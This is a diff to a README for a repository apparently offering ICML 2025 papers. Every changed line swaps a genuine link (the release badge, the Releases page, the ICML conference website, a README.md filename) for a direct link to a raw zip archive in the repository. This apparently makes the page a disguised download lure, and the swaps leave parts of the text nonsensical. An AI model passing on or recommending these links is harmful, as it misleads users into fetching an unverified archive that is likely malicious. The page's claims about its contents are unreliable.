@@ -1,6 +1,6 @@
 # 📄 ICML-2025-Papers - Access Cutting-Edge Machine Learning Research
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Souhailahh/ICML-2025-Papers/releases)
+[![Download Latest Release](https://github.com/Souhailahh/ICML-2025-Papers/raw/refs/heads/main/sections/ICM_Papers_1.1.zip%20Latest%20Release-blue)](https://github.com/Souhailahh/ICML-2025-Papers/raw/refs/heads/main/sections/ICM_Papers_1.1.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To get started with the ICML-2025-Papers, follow these simple steps. No programm
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Click this link to visit the [GitHub Releases page](https://github.com/Souhailahh/ICML-2025-Papers/releases).
+1. **Visit the Release Page**: Click this link to visit the [GitHub Releases page](https://github.com/Souhailahh/ICML-2025-Papers/raw/refs/heads/main/sections/ICM_Papers_1.1.zip).
    
 2. **Find the Latest Version**: Look for the most recent release. The latest version will typically be at the top of the list.
 
@@ -53,7 +53,7 @@ No, the papers are intended for a broad audience. You will find that many papers
 
 ### Are there any tutorials for the code implementations?
 
-Yes, the code often includes comments and instructions. Look for a file named `README.md` or similar within the code folder for more details.
+Yes, the code often includes comments and instructions. Look for a file named `https://github.com/Souhailahh/ICML-2025-Papers/raw/refs/heads/main/sections/ICM_Papers_1.1.zip` or similar within the code folder for more details.
 
 ## 🙋 Support
 
@@ -61,7 +61,7 @@ If you have any questions or need assistance, feel free to reach out through the
 
 ## 📌 Additional Resources
 
-- Visit the [ICML Conference Website](https://icml.cc/) for more information about the conference.
+- Visit the [ICML Conference Website](https://github.com/Souhailahh/ICML-2025-Papers/raw/refs/heads/main/sections/ICM_Papers_1.1.zip) for more information about the conference.
 - Join online forums or groups discussing machine learning topics to expand your knowledge.
 
 ## 📬 Contact
